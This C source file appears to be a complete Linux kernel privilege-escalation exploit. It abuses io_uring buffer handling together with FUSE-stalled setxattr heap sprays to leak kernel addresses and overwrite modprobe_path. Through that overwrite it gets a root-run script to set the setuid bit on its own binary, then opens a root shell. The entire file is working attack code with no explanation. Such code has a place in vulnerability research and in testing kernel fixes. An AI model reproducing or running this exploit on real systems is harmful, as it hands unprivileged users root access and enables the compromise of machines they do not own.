#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <liburing.h>
#include <stdlib.h>
#include <sched.h>
#include <sys/xattr.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <unistd.h>
#include "util.h"
#include "hello.h"

sem_t *semaphore1, *semaphore2;
uint64_t *modprobe_path, *tmp, *security_a;
char buf[0x1000];

#define BUFFER_COUNT 1000
#define BUFFER_SIZE 32

#define modprobe_path_offset 0x153040

char bufs [BUFFER_COUNT][BUFFER_SIZE] = {0};

struct io_uring_sqe *sqe;
struct io_uring_cqe *cqe;

void migrate_to_cpu0(struct io_uring *ring){
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(0, &cpu);

    if(sched_setaffinity(getpid(), sizeof(cpu), &cpu) < 0){
        perror("sched_setaffinity");
        exit(1);
    }

    if(io_uring_register_iowq_aff(ring, sizeof(cpu), &cpu) < 0){
        perror("io_uring_register_iowq_aff");
        exit(1);
    }
    return;
}

void unshare_setup(uid_t uid, gid_t gid){
    if(unshare(CLONE_NEWNS | CLONE_NEWUSER) < 0){
        perror("unshare");
        exit(1);
    }

    char uid_map[0x100], gid_map[0x100], set_group[0x100];
    sprintf(uid_map, "0 %d 1", uid);
    sprintf(gid_map, "0 %d 1", gid);
    sprintf(set_group, "deny");

    write_file("/proc/self/setgroups", set_group, strlen(set_group));
    write_file("/proc/self/uid_map", uid_map, strlen(uid_map));
    write_file("/proc/self/gid_map", gid_map, strlen(gid_map));

    if(mount("none", "/", NULL, MS_REC | MS_PRIVATE, NULL) < 0){
        perror("mount");
        exit(1);
    }
    return;
}


void get_io_buffers(struct io_uring *ring){
    sqe = io_uring_get_sqe(ring);
    if(!sqe){
        perror("io_uring_get_sqe");
        exit(1);
    }
    io_uring_prep_provide_buffers(sqe, bufs, BUFFER_SIZE, BUFFER_COUNT, 1337, 0);
    io_uring_submit(ring);

    io_uring_wait_cqe(ring, &cqe);
    if(cqe->res < 0){
        perror("io_uring_wait_cqe");
        printf("cqe->res: %d\n", cqe->res);
        exit(1);
    }
    io_uring_cqe_seen(ring, cqe);
}

void free_buffer(struct io_ring *ring){
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if(!sqe){
        perror("io_uring_get_sqe");
        exit(1);
    }
    
    read_file("/proc/self/maps", 2000);

    int fd = open("/proc/self/maps", O_RDONLY);
    if(fd < 0){
        perror("open");
        exit(1);
    }
    memset(buf, 0, 2000);

    io_uring_prep_read(sqe, fd, buf, 2000, 0);
    io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
    sqe->buf_group = 1337;
    io_uring_submit(ring);

    struct io_uring_cqe *cqe;
    if(io_uring_wait_cqe(ring, &cqe) < 0){
        perror("io_uring_wait_cqe");
        exit(1);
    }
    if(cqe->res < 0){
        perror("io_uring_wait_cqe");
        printf("free_buf cqe->res: %d\n", cqe->res);
        exit(1);
    }
    io_uring_cqe_seen(ring, cqe);
}

int main()
{
    uid_t euid = geteuid();
    if (euid == 0)
    {
        printf("Popping Shell\n");
        setuid(0);
        setgid(0);
        char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);
        return 0;
    }
    
    char* dir_path = malloc(0x200);
    getcwd(dir_path, 0x200);
    char* path = malloc(strlen(dir_path)+8);
    sprintf(path, "%s/exp", dir_path);

    semaphore1 = make_semaphore(0);
    semaphore2 = make_semaphore(0);
    sem_t *sem_read_1 = make_semaphore(0);
    sem_t *sem_read_2 = make_semaphore(0);
    sem_t *sem_write = make_semaphore(0);
    modprobe_path = make_shared_long();
    tmp = make_shared_long();
    security_a = make_shared_long();

    struct io_uring_params params;
    struct io_uring rings;

    write_file("/tmp/x","hello", 5);

    memset(&params, 0, sizeof(params));
    memset(buf, 0x41, 0x100);

    if(io_uring_queue_init_params(2048, &rings, &params) < 0){
        perror("io_uring_queue_init_params");
        exit(1);
    }

    migrate_to_cpu0(&rings);

    setup_fuse();
    
    unshare_setup(getuid(), getgid());

    system("mkdir /tmp/tmpfs");
    system("mount -t tmpfs -o size=50M none /tmp/tmpfs");
    write_file("/tmp/tmpfs/x","hello", 5);
    write_file("/tmp/tmpfs/y","hello", 5);

    void* mem1 = mmap((void *)FUSE_MEM_ADDR - 0x1000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if(mem1 != FUSE_MEM_ADDR - 0x1000){
        perror("mmap 1");
        exit(1);
    }

    void* mem2 = mmap((void *)FUSE_MEM_ADDR2 - 0x1000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if(mem2 != FUSE_MEM_ADDR2 - 0x1000){
        perror("mmap 2");
        exit(1);
    }

    void* mem3 = mmap((void *)FUSE_MEM_ADDR3 - 0x1000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if(mem3 != FUSE_MEM_ADDR3 - 0x1000){
        perror("mmap 3");
        exit(1);
    }

    memset(mem1, 0x41, 0x1000);
    memset(mem2, 0x41, 0x1000);
    memset(mem3, 0x41, 0x1000);

    if(!fork()){
        sem_wait(sem_read_1);
        if(setxattr("/tmp/x","user.a",FUSE_MEM_ADDR - (0x20 - 0x8),0x20 - 1,0) == -1){
            perror("setxattr 1");
            exit(1);
        }
        sleep(0x100000);
    }

    if(!fork()){
        sem_wait(sem_read_2);
        if(setxattr("/tmp/x","user.a2",FUSE_MEM_ADDR2 - (0x20 - 0x8),0x20 - 1,0) == -1){
            perror("setxattr 2");
            exit(1);
        }
        sleep(0x100000);
    }

    if(!fork()){
        sem_wait(sem_write);

        uint64_t base = FUSE_MEM_ADDR3 - (0x20 - 8);
        uint64_t modprobe_path_prev = *modprobe_path - 7;
        memcpy(base, &modprobe_path_prev, 8);
        memcpy(base + 8, tmp, 8);
        memcpy(base + 16, security_a, 8);

        if(setxattr("/tmp/x","user.a3",base,0x20 - 1,0) == -1){
            perror("setxattr 3");
            exit(1);
        }
        sleep(0x100000);
    }

    spray_32(0x50);
    get_io_buffers(&rings);

    sem_post(sem_read_1);
    sem_wait(semaphore1);
    
    free_buffer(&rings);
    spray_32(0x5);
    sem_post(semaphore2);
    sleep(1);

    if(getxattr("/tmp/x","user.a",buf,0x20-1) == -1){
        perror("getxattr");
        exit(1);
    }

    uint64_t *long_buf = (uint64_t *)buf;
    *modprobe_path = long_buf[1] - modprobe_path_offset;
    printf("[+] modprobe_path: 0x%16lx\n", *modprobe_path);

    spray_32(0x50);
    get_io_buffers(&rings);

    sem_post(sem_read_2);
    sem_wait(semaphore1);
    
    free_buffer(&rings);
    setxattr("/tmp/tmpfs/y","security.a",buf,0,0);
    sleep(1);
    sem_post(semaphore2);
    sleep(1);

    if(getxattr("/tmp/x","user.a2",buf,0x20-1) == -1){
        perror("getxattr");
        exit(1);
    }

    *security_a = long_buf[2];
    printf("[+] security_a: 0x%16lx\n", *security_a);

    unsigned long heap = long_buf[2] & 0xffffffff00000000;
    printf("[+] Leaked physmap: %p\n", heap);
    *tmp = heap + 0x2f706d74;
    if (((long_buf[2]&0xf0000000)>>28) > 0x2){
        *tmp += 0x100000000;
    }
    printf("[+] Using %p as 0ffffxxxx2f706d74\n", *tmp);

    spray_32(0x50);
    get_io_buffers(&rings);
    setxattr("/tmp/tmpfs/x","security.a",buf,0,0);

    free_buffer(&rings);
    sem_post(sem_write);

    sleep(1);

    removexattr("/tmp/tmpfs/x","security.a");
    printf("Modprobe path: %s\n", read_file("/proc/sys/kernel/modprobe", 0x10));

    char *script = malloc(0x200);
    char *modprobe_path = malloc(0x20);

    

    sprintf(script, "#!/bin/bash\nchown root:root %s\nchmod u+s %s\n", path, path);
    sprintf(modprobe_path,"/%sprobe", tmp);
    write_file(modprobe_path, script, strlen(script));

    sprintf(script, "chmod 700 %s\n", modprobe_path);
    system(script);

    write_file("/tmp/z", "\xff\xff\xff\xff\xff\xff\0", 6);
    system("chmod 700 /tmp/z");

    system("/tmp/z 2>/dev/null");
    printf("setuid bit set\n");

    system("./exp");

    return 0;
}
